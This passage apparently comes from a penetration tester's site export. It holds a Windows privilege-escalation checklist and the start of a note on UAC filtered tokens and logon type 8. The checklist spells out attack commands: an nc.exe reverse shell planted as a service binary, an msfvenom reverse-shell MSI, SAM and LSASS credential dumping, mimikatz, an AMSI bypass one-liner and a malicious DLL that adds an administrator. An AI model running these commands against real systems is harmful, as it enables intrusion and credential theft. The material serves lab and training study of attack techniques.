<strong>PrintSpoofer</strong> — if GodPotato doesn't work\n- <strong>JuicyPotato</strong> — only on Windows &lt; 10 1809 and Server 2016\n- <strong>RoguePotato</strong> — alternative for environments where others fail</p>\n</blockquote>\n<hr>\n<h2 id=\"4-windows-services\">4 // Windows Services</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List services and permissions</li>\n</ul>\n<pre><code class=\"language-cmd\">sc query state= all\nwmic service list brief\n</code></pre>\n<pre><code class=\"language-powershell\">Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;}\nGet-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName, StartName, State | Format-List\n</code></pre>\n<h3 id=\"unquoted-service-path\">Unquoted Service Path</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for paths without quotes containing spaces</li>\n</ul>\n<pre><code class=\"language-cmd\">wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;C:\\Windows\\\\&quot; | findstr /i /v &quot;&quot;&quot;\n</code></pre>\n<pre><code class=\"language-powershell\">Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike '&quot;*' -and $_.PathName -like '* *' } | Select-Object Name, PathName, StartName\n</code></pre>\n<blockquote>\n<p><strong>Unquoted Service Path</strong><br>\nIf the service path contains spaces and is not enclosed in quotes (e.g., <code>C:\\Program Files\\My App\\service.exe</code>), Windows tries the paths in the following order:\n1. <code>C:\\Program.exe</code>\n2. <code>C:\\Program Files\\My.exe</code>\n3. <code>C:\\Program Files\\My App\\service.exe</code></p>\n<p>If we can write to any of these directories, we can insert a malicious binary.</p>\n</blockquote>\n<h3 id=\"weak-service-permissions\">Weak Service Permissions</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check permissions on services with accesschk</li>\n</ul>\n<pre><code class=\"language-cmd\">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; * /c\naccesschk.exe /accepteula -uwcqv &quot;&lt;USERNAME&gt;&quot; * /c\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If we can modify a service (SERVICE_CHANGE_CONFIG)</li>\n</ul>\n<pre><code class=\"language-cmd\">sc config &lt;SERVICE_NAME&gt; binPath= &quot;C:\\Users\\Public\\nc.exe &lt;LHOST&gt; &lt;LPORT&gt; -e cmd.exe&quot;\nsc stop &lt;SERVICE_NAME&gt;\nsc start &lt;SERVICE_NAME&gt;\n</code></pre>\n<h3 id=\"weak-file-permissions-on-service-binary\">Weak File Permissions on Service Binary</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check permissions on the service binary</li>\n</ul>\n<pre><code class=\"language-cmd\">icacls &quot;C:\\Path\\To\\service.exe&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If writable → replace with payload</li>\n</ul>\n<pre><code class=\"language-cmd\">move &quot;C:\\Path\\To\\service.exe&quot; &quot;C:\\Path\\To\\service.exe.bak&quot;\ncopy C:\\Users\\Public\\payload.exe &quot;C:\\Path\\To\\service.exe&quot;\nsc stop &lt;SERVICE_NAME&gt;\nsc start &lt;SERVICE_NAME&gt;\n\n## 5 // Scheduled Tasks\n\n- [ ] List scheduled tasks\n```cmd\nschtasks /query /fo LIST /v\nschtasks /query /fo TABLE\n</code></pre>\n<pre><code class=\"language-powershell\">Get-ScheduledTask | Where-Object {$_.State -eq &quot;Ready&quot;}\nGet-ScheduledTask | ForEach-Object { $_ | Get-ScheduledTaskInfo }\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for tasks that execute writable scripts/binaries</li>\n</ul>\n<pre><code class=\"language-powershell\">Get-ScheduledTask | ForEach-Object {\n    $actions = $_.Actions\n    foreach ($action in $actions) {\n        if ($action.Execute) {\n            [PSCustomObject]@{\n                TaskName = $_.TaskName\n                Execute = $action.Execute\n                Arguments = $action.Arguments\n                RunAs = $_.Principal.UserId\n            }\n        }\n    }\n} | Format-Table -AutoSize\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check permissions on referenced scripts</li>\n</ul>\n<pre><code class=\"language-cmd\">icacls &quot;C:\\Path\\To\\scheduled_script.ps1&quot;\n</code></pre>\n<hr>\n<h2 id=\"6-registry\">6 // Registry</h2>\n<h3 id=\"alwaysinstallelevated\">AlwaysInstallElevated</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check if MSI installs with elevated privileges</li>\n</ul>\n<pre><code class=\"language-cmd\">reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>\n<p>If both are <code>1</code>:</p>\n<pre><code class=\"language-bash\"># On the attacker // generate malicious MSI\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f msi -o evil.msi\n\n# On the target\nmsiexec /quiet /qn /i evil.msi\n</code></pre>\n<h3 id=\"autorun-programs\">AutoRun Programs</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check autorun programs with weak permissions</li>\n</ul>\n<pre><code class=\"language-cmd\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check permissions on referenced binaries</li>\n</ul>\n<pre><code class=\"language-cmd\">icacls &quot;C:\\Path\\To\\autorun.exe&quot;\n</code></pre>\n<h3 id=\"stored-credentials-in-registry\">Stored Credentials in Registry</h3>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for passwords in the registry</li>\n</ul>\n<pre><code class=\"language-cmd\">reg query HKLM /f password /t REG_SZ /s 2&gt;nul | findstr /i &quot;password&quot;\nreg query HKCU /f password /t REG_SZ /s 2&gt;nul | findstr /i &quot;password&quot;\nreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot; 2&gt;nul\n</code></pre>\n<hr>\n<h2 id=\"7-passwords-and-credentials\">7 // Passwords and Credentials</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Saved Credentials (Credential Manager)</li>\n</ul>\n<pre><code class=\"language-cmd\">cmdkey /list\n</code></pre>\n<p>If there are saved credentials:</p>\n<pre><code class=\"language-cmd\">runas /savecred /user:&lt;DOMAIN&gt;\\&lt;USER&gt; cmd.exe\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SAM and SYSTEM (if SeBackupPrivilege or admin)</li>\n</ul>\n<pre><code class=\"language-cmd\">reg save HKLM\\SAM C:\\Users\\Public\\SAM\nreg save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM\n</code></pre>\n<pre><code class=\"language-bash\"># On the attacker\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> DPAPI — encrypted credentials</li>\n</ul>\n<pre><code class=\"language-powershell\"># Search for credential files\ndir C:\\Users\\&lt;USER&gt;\\AppData\\Local\\Microsoft\\Credentials\\\ndir C:\\Users\\&lt;USER&gt;\\AppData\\Roaming\\Microsoft\\Credentials\\\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Files containing passwords</li>\n</ul>\n<pre><code class=\"language-cmd\">findstr /si &quot;password&quot; *.txt *.ini *.config *.xml *.cfg 2&gt;nul\nfindstr /spin &quot;password&quot; C:\\*.txt C:\\*.ini C:\\*.config 2&gt;nul\n</code></pre>\n<pre><code class=\"language-powershell\">Get-ChildItem -Path C:\\ -Include *.txt,*.ini,*.config,*.xml,*.cfg,*.ps1 -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;password|passwd|pwd|credential|secret&quot; | Select-Object Path, LineNumber, Line\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Unattend / Sysprep files (plaintext or base64 passwords)</li>\n</ul>\n<pre><code class=\"language-cmd\">dir /s /b C:\\unattend.xml C:\\sysprep.xml C:\\sysprep.inf C:\\Autounattend.xml 2&gt;nul\ntype C:\\Windows\\Panther\\unattend.xml 2&gt;nul\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml 2&gt;nul\ntype C:\\Windows\\system32\\sysprep\\sysprep.xml 2&gt;nul\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Web config files</li>\n</ul>\n<pre><code class=\"language-cmd\">type C:\\inetpub\\wwwroot\\web.config 2&gt;nul\ndir /s /b C:\\inetpub\\*.config 2&gt;nul\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> PowerShell history</li>\n</ul>\n<pre><code class=\"language-powershell\">type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nGet-Content (Get-PSReadlineOption).HistorySavePath\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> WiFi passwords</li>\n</ul>\n<pre><code class=\"language-cmd\">netsh wlan show profiles\nnetsh wlan show profile name=&quot;&lt;SSID&gt;&quot; key=clear\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Application configuration files</li>\n</ul>\n<pre><code class=\"language-cmd\">type &quot;C:\\Program Files (x86)\\hMailServer\\Bin\\hMailServer.INI&quot; 2&gt;nul\ntype C:\\xampp\\passwords.txt 2&gt;nul\ntype C:\\xampp\\apache\\conf\\httpd.conf 2&gt;nul\n</code></pre>\n<hr>\n<h2 id=\"8-internal-services-and-network\">8 // Internal Services and Network</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Listening Ports</li>\n</ul>\n<pre><code class=\"language-cmd\">netstat -ano\nnetstat -ano | findstr LISTENING\n</code></pre>\n<pre><code class=\"language-powershell\">Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess | Sort-Object LocalPort\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Non-exposed Services (only 127.0.0.1)</li>\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Network Interfaces and Routing</li>\n</ul>\n<pre><code class=\"language-cmd\">ipconfig /all\nroute print\narp -a\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Firewall Rules</li>\n</ul>\n<pre><code class=\"language-cmd\">netsh advfirewall show allprofiles\nnetsh advfirewall firewall show rule name=all\n</code></pre>\n<pre><code class=\"language-powershell\">Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object DisplayName, Direction, Action\n</code></pre>\n<hr>\n<h2 id=\"9-installed-software-and-cve\">9 // Installed Software and CVE</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Installed Software</li>\n</ul>\n<pre><code class=\"language-cmd\">wmic product get name,version\n</code></pre>\n<pre><code class=\"language-powershell\">Get-ItemProperty &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | Select-Object DisplayName, DisplayVersion\nGet-ItemProperty &quot;HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*&quot; | Select-Object DisplayName, DisplayVersion\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Specific Versions → Search for CVE</li>\n</ul>\n<pre><code class=\"language-cmd\">searchsploit &lt;software&gt; &lt;version&gt;\n</code></pre>\n<h3 id=\"common-known-exploits\">Common Known Exploits</h3>\n<table>\n<thead>\n<tr>\n<th>Software</th>\n<th>CVE</th>\n<th>Impact</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>LibreOffice &lt; 24.2.4</td>\n<td>CVE-2023-2255</td>\n<td>RCE via macros in documents</td>\n</tr>\n<tr>\n<td>WinRAR &lt; 6.23</td>\n<td>CVE-2023-38831</td>\n<td>RCE via .rar files</td>\n</tr>\n<tr>\n<td>PrintNightmare</td>\n<td>CVE-2021-1675 / CVE-2021-34527</td>\n<td>Local/Remote privilege escalation via Print Spooler</td>\n</tr>\n<tr>\n<td>HiveNightmare</td>\n<td>CVE-2021-36934</td>\n<td>Reading SAM/SYSTEM without admin rights</td>\n</tr>\n<tr>\n<td>KrbRelayUp</td>\n<td>-</td>\n<td>Privilege escalation in domain-joined machines</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"10-token-impersonation-and-lsass\">10 // Token Impersonation and LSASS</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> List available tokens (if SeImpersonate or admin)</li>\n</ul>\n<pre><code># From Meterpreter\nload incognito\nlist_tokens -u\nimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Dump LSASS (if SeDebugPrivilege or admin)</li>\n</ul>\n<pre><code class=\"language-cmd\"># Task Manager → Details → lsass.exe → Create dump file\n\n# Or with procdump\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Or with comsvcs.dll\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\\Users\\Public\\lsass.dmp full\n</code></pre>\n<pre><code class=\"language-bash\"># On the attacker\npypykatz lsa minidump lsass.dmp\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Mimikatz (if admin/SYSTEM)</li>\n</ul>\n<pre><code class=\"language-cmd\">mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\n</code></pre>\n<hr>\n<h2 id=\"11-active-directory-se-domain-joined\">11 // Active Directory (se domain-joined)</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check if the machine is in a domain</li>\n</ul>\n<pre><code class=\"language-cmd\">systeminfo | findstr /B &quot;Domain&quot;\nnltest /dclist:&lt;DOMAIN&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Kerberoasting</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt; -dc-ip &lt;DC_IP&gt; -request\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> AS-REP Roasting</li>\n</ul>\n<pre><code class=\"language-bash\">impacket-GetNPUsers &lt;DOMAIN&gt;/ -dc-ip &lt;DC_IP&gt; -usersfile users.txt -no-pass\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> BloodHound enumeration</li>\n</ul>\n<pre><code class=\"language-powershell\"># SharpHound\n.\\SharpHound.exe -c All\n</code></pre>\n<pre><code class=\"language-bash\"># From the attacker\nbloodhound-python -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; -dc &lt;DC_HOSTNAME&gt; -c All\n</code></pre>\n<hr>\n<h2 id=\"12-dll-hijacking\">12 // DLL Hijacking</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for applications loading missing DLLs</li>\n</ul>\n<pre><code class=\"language-powershell\"># Use Process Monitor (procmon) with filter &quot;NAME NOT FOUND&quot; on .dll\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Search for writable directories in the PATH</li>\n</ul>\n<pre><code class=\"language-cmd\">echo %PATH%\n</code></pre>\n<pre><code class=\"language-powershell\">$env:PATH -split &quot;;&quot; | ForEach-Object { icacls $_ 2&gt;$null }\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> If a directory in the PATH is writable → place malicious DLL</li>\n</ul>\n<pre><code class=\"language-c\">// dll_hijack.c\n#include &lt;windows.h&gt;\nBOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {\n    if (fdwReason == DLL_PROCESS_ATTACH) {\n        system(&quot;cmd /c net localgroup Administrators &lt;USER&gt; /add&quot;);\n    }\n    return TRUE;\n}\n</code></pre>\n<pre><code class=\"language-bash\">x86_64-w64-mingw32-gcc dll_hijack.c -shared -o missing.dll\n</code></pre>\n<hr>\n<h2 id=\"13-antivirus-and-amsi-bypass\">13 // Antivirus and AMSI Bypass</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check if AV is active</li>\n</ul>\n<pre><code class=\"language-cmd\">sc query WinDefend\n</code></pre>\n<pre><code class=\"language-powershell\">Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> AMSI bypass (to run PowerShell scripts)</li>\n</ul>\n<pre><code class=\"language-powershell\"># Simple bypass (may vary between versions)\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> AppLocker / WDAC policies</li>\n</ul>\n<pre><code class=\"language-powershell\">Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections\n</code></pre>\n<hr>\n<h2 id=\"14-automated-enumeration\">14 // Automated Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>WinPEAS</strong></li>\n</ul>\n<pre><code class=\"language-cmd\">winpeas.exe\nwinpeas.exe fast              # fast scan\nwinpeas.exe servicesinfo      # services only\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>PowerUp</strong> (PowerShell)</li>\n</ul>\n<pre><code class=\"language-powershell\">. .\\PowerUp.ps1\nInvoke-AllChecks\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>SharpUp</strong></li>\n</ul>\n<pre><code class=\"language-cmd\">SharpUp.exe audit\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> <strong>Seatbelt</strong></li>\n</ul>\n<pre><code class=\"language-cmd\">Seatbelt.exe -group=all\n</code></pre>\n<hr>\n<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>whoami /priv</code> — check SeImpersonate and other dangerous privileges\n2. <code>whoami /groups</code> — membership in privileged groups\n3. Saved credentials (<code>cmdkey /list</code>, PowerShell history, web.config, unattend.xml)\n4. Passwords in application configuration files (hMailServer.INI, XAMPP, etc.)\n5. Services with unquoted paths or weak permissions\n6. Scheduled tasks with writable scripts\n7. AlwaysInstallElevated (registry)\n8. Installed software → search for CVEs\n9. WinPEAS for catch-all\n10. If domain-joined: Kerberoasting, BloodHound\n11. Kernel exploits (last resort — PrintNightmare, HiveNightmare)</p>\n</blockquote>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Aero</td>\n<td>CLFS EoP CVE-2023-28252 — kernel exploit drops a SYSTEM token</td>\n</tr>\n<tr>\n<td>Buff</td>\n<td>CloudMe buffer overflow + msfvenom shellcode → SYSTEM after Ligolo tunnel exposes the local-only listener</td>\n</tr>\n<tr>\n<td>Escape</td>\n<td>ADCS ESC1 — <code>UserAuthentication</code> template with <code>EnrolleeSuppliesSubject</code> → impersonate Administrator → PtH</td>\n</tr>\n<tr>\n<td>Love</td>\n<td><code>AlwaysInstallElevated</code> registry pair both = 1 → craft malicious MSI → <code>msiexec /quiet /i</code> → SYSTEM</td>\n</tr>\n<tr>\n<td>Mailing</td>\n<td>CVE-2023-2255 LibreOffice macro chained with WinRM into the elevated user's session</td>\n</tr>\n<tr>\n<td>Remote</td>\n<td>GodPotato — <code>SeImpersonatePrivilege</code> on the service account → SYSTEM</td>\n</tr>\n</tbody>\n</table>"
    }
  ],
  "notes": [
    {
      "title": "Logon Type 8 and UAC Filtered Tokens",
      "slug": "logon-type-8-and-uac-filtered-tokens",
      "date": "2026·04·27",
      "tags": [
        "windows",
        "uac",
        "privilege escalation",
        "runascs",
        "authentication"
      ],
      "desc": "Context On Signed, after creating a local user sverz and adding it to Administrators via a SYSTEM-context DLL plant (WerFault), the first attempt at a reverse shell — RunasCs.exe sverz &lt;pwd&gt; powershell -r 10.10.14.139:80 — produced a callback that failed Access denied on…",
      "body": "<h1 id=\"logon-type-8-and-uac-filtered-tokens-why-a-fresh-local-admin-cant-read-cusersadministrator\">Logon Type 8 and UAC Filtered Tokens // Why a Fresh Local Admin Can't Read <code>C:\\Users\\Administrator</code></h1>\n<blockquote>\n<p><strong>Context</strong><br>\nOn Signed, after creating a local user <code>sverz</code> and adding it to <code>Administrators</code> via a SYSTEM-context DLL plant (WerFault), the first attempt at a reverse shell — <code>RunasCs.exe sverz &lt;pwd&gt; powershell -r 10.10.14.139:80</code> — produced a callback that failed <code>Access denied</code> on <code>cd C:\\Users\\Administrator</code>. The fix was the flag combination <code>--bypass-uac --logon-type 8</code>. This note explains why that combination is necessary and what each flag actually does.</p>\n</blockquote>\n<hr>\n<h2 id=\"1-the-counter-intuitive-bit\">1 // The Counter-Intuitive Bit</h2>\n<p>Adding a user to the <code>Administrators</code> group does <strong>not</strong> give them an active admin token. The password verifies, the logon succeeds, the user is in <code>Administrators</code> — and yet <code>whoami /groups</code> shows:</p>\n<pre><code>BUILTIN\\Administrators                Group used for deny only      S-1-5-32-544\nMandatory Label\\Medium Mandatory Level    Label                     S-1-16-8192\n</code></pre>\n<p><code>Administrators</code> is marked <strong>deny-only</strong>, integrity level is <strong>Medium</strong>. The admin SID is in the token but disabled. ACLs that require <code>Administrators</code> as <code>ALLOW</code> (e.g. <code>C:\\Users\\Administrator\\</code>) deny. Operations needing High IL (modifying <code>HKLM</code>, writing <code>System32</code>, reading certain profile directories) deny.</p>\n<p>This is <strong>UAC token filtering</strong>, and it applies to <em>any</em> non-built-in admin (RID ≠ 500) on Interactive/Batch logon types when UAC is enabled — which is the default on every modern Windows.</p>\n<hr>\n<h2 id=\"2-how-lsass-builds-two-tokens-at-logon\">2 // How LSASS Builds Two Tokens at Logon</h2>\n<p>When <code>LSASS</code> authenticates a user that is in <code>Administrators</code> (and is not the built-in <code>Administrator</code> RID 500 with UAC disabled), it builds <strong>two tokens</strong>:</p>\n<ol>\n<li><strong>Filtered token</strong> — copy of the full token where admin SIDs are flagged <code>SE_GROUP_USE_FOR_DENY_ONLY</code> and sensitive privileges (<code>SeDebugPrivilege</code>, <code>SeTakeOwnershipPrivilege</code>, etc.) are stripped. Integrity Level = <strong>Medium</strong>.</li>\n<li><strong>Elevated token</strong> — the full original token. Integrity Level = <strong>High</strong>. Linked to the filtered one via <code>TokenLinkedToken</code>.</li>\n</ol>\n<p>The <strong>filtered token is activated by default</strong>. The elevated one is available but \"asleep\" — UAC consent UI, RunAs Administrator, or targeted API calls (<code>GetTokenInformation(TokenLinkedToken)</code>) wake it up.</p>\n<hr>\n<h2 id=\"3-concrete-diff-between-logon-types\">3 // Concrete Diff Between Logon Types</h2>\n<table>\n<thead>\n<tr>\n<th>Logon type</th>\n<th style=\"text-align: right;\">Value</th>\n<th>Filtered by default?</th>\n<th>Use case</th>\n<th>What you lose / gain</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Interactive</td>\n<td style=\"text-align: right;\"><strong>2</strong></td>\n<td>✅ yes</td>\n<td>Console / RDP login</td>\n<td>Filtered token, Medium IL, UAC consent required for elevation</td>\n</tr>\n<tr>\n<td>Network</td>\n<td style=\"text-align: right;\"><strong>3</strong></td>\n<td>❌ <strong>no</strong></td>\n<td>SMB, WinRM, RPC with auth</td>\n<td>Full token, High IL — no UAC at all on remote logons</td>\n</tr>\n<tr>\n<td>Batch</td>\n<td style=\"text-align: right;\">4</td>\n<td>✅ yes</td>\n<td>Task Scheduler / non-system services</td>\n<td>Same as Interactive</td>\n</tr>\n<tr>\n<td>Service</td>\n<td style=\"text-align: right;\">5</td>\n<td>❌ no</td>\n<td>Service account inheritance</td>\n<td>Service-context full token</td>\n</tr>\n<tr>\n<td>NetworkCleartext</td>\n<td style=\"text-align: right;\"><strong>8</strong></td>\n<td>❌ <strong>no</strong></td>\n<td>IIS Basic, plain-cred APIs</td>\n<td>Same as type 3 BUT accepts cleartext password</td>\n</tr>\n<tr>\n<td>NewCredentials</td>\n<td style=\"text-align: right;\">9</td>\n<td>✅ (cosmetic)</td>\n<td><code>runas /netonly</code></td>\n<td>Token used only for outgoing auth</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Type 3 and type 8 are the escape hatches from UAC filtering</strong> when you don't have a consent UI. Type 8 is special because it accepts cleartext credentials (necessary when all you have is a username + password, not an already-impersonated handle).</p>\n<h3 id=\"what-this-looks-like-in-whoami-groups\">What this looks like in <code>whoami /groups</code></h3>\n<p>Same user <code>sverz</code> (member of <code>Administrators</code>), authenticated two different ways:</p>\n<pre><code class=\"language-text\">== Interactive (logon type 2) — filtered token ==\nBUILTIN\\Administrators              Group used for deny only          S-1-5-32-544\nMandatory Label\\Medium Mandatory Level   Label                        S-1-16-8192\nSeChangeNotifyPrivilege             Enabled\nSeIncreaseWorkingSetPrivilege       Disabled\n\n== NetworkCleartext (logon type 8) via --bypass-uac — elevated token ==\nBUILTIN\\Administrators              Group, Enabled                    S-1-5-32-544\nMandatory Label\\High Mandatory Level     Label                        S-1-16-12288\nSeImpersonatePrivilege              Enabled\nSeAssignPrimaryTokenPrivilege       Enabled\nSeBackupPrivilege                   Enabled\nSeRestorePrivilege                  Enabled\nSeTakeOwnershipPrivilege            Enabled\n…\n</code></pre>\n<p>Same user, same password, same machine. Different logon path → different active token. <strong>The privileges 